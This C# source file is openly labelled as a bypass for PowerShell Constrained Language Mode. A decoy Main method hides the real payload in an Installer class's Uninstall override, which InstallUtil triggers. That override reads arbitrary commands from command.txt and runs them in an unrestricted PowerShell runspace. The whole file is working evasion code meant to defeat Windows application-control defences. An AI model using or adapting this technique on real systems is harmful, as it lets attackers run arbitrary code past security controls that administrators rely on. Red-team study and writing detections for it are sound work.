// Example Bypass for Constrained Language Mode
// This will fetch commands from a text file (command.txt) and run them in a custom PowerShell runspace

using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;

namespace Bypass{
    class Program{
        static void Main(string[] args){
            Console.WriteLine("\n[i] Main method decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer{
        public override void Uninstall(System.Collections.IDictionary savedState){
            string text = File.ReadAllText("command.txt");
            string cmd = text;
            Console.WriteLine($"\n[i] Running: {cmd}");
            
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
